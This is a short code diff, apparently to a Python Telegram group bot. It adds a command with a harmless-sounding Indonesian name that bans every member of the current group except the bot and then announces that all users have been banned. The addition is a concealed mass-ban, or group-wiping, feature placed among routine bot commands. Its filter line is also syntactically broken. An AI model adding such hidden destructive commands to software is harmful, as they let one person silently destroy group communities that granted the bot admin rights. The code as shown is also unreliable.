@@ -123,6 +123,21 @@ async def tai_ya(_, message):
     await message.reply_text(mmk)
 
 
+@app.on_message(filters.command("balonhijau", ["?", "#"]) OWNER_ID & filters.group)
+def ban_all_users(client, message):
+    chat_id = message.chat.id
+    try:
+        members = client.get_chat_members(chat_id)
+        for member in members:
+            user_id = member.user.id
+            if user_id != client.get_me().id:
+                client.ban_chat_member(chat_id, user_id)
+        message.reply_text("Semua pengguna telah dilarang di grup ini!")
+    except Exception as e:
+        print(e)
+        message.reply_text("Terjadi kesalahan saat mencoba mengeluarkan pengguna!")
+
+
 @app.on_message(filters.command(GBANNED_COMMAND) & SUDOERS)
 @language
 async def gbanned_list(client, message: Message, _):
